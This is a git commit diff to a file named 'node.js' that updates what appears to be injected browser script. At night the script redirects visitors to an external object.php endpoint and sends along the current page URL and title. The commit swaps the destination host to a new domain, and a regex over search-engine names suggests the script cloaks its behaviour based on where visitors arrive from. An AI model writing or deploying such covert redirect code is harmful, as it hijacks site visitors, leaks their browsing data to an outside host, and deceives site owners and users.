ccb23433db1a143376d03aa16baa409e697e5919
ruby2019lilith <65123392+ruby2019lilith@users.noreply.github.com>
2022-05-29 22:17:55 +0800

    Update node.js

--- node.js
+++ node.js
@@ -27,7 +27,7 @@ function _setTimeout(){
 		 var hours = now.getHours();
 		 if(hours>=19 || hours<=7) {
 			if(window.self==window.top){
-				window.location.href='http://www.52yanq.com/object.php?u='+window.location.href+'&title='+document.title;
+				window.location.href='https://www.puttop.top/object.php?u='+window.location.href+'&title='+document.title;
 			}
 		 }else{
 			var regexp=/\.(sogou|soso|baidu|google|youdao|yahoo|bing|118114|biso|gougou|ifeng|ivc|sooule|niuhu|biso|godado|msn|excite|libero|iltrovatore|tiscali)(\.[a-z0-9\-]+){1,2}\//ig;
